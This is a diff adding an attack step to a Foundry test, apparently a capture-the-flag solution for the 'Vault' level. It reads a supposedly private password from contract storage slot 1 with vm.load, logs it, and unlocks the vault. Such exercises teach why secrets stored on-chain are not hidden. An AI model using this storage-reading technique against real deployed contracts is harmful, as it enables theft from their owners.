@@ -32,6 +32,18 @@ contract VaultTest is Test {
         // LEVEL ATTACK //
         //////////////////
 
+        // password variable stored at slot 1
+        // vm.load(addr, slot number) --> storage slot
+        //
+        bytes32 password = vm.load(levelAddress, bytes32(uint256(1)));
+
+        // 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
+        // A very strong secret password :) --> web3 type converter
+        emit log_bytes(abi.encodePacked(password));
+
+        vaultContract.unlock(password);
+        assertEq(vaultContract.locked(), false);
+
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
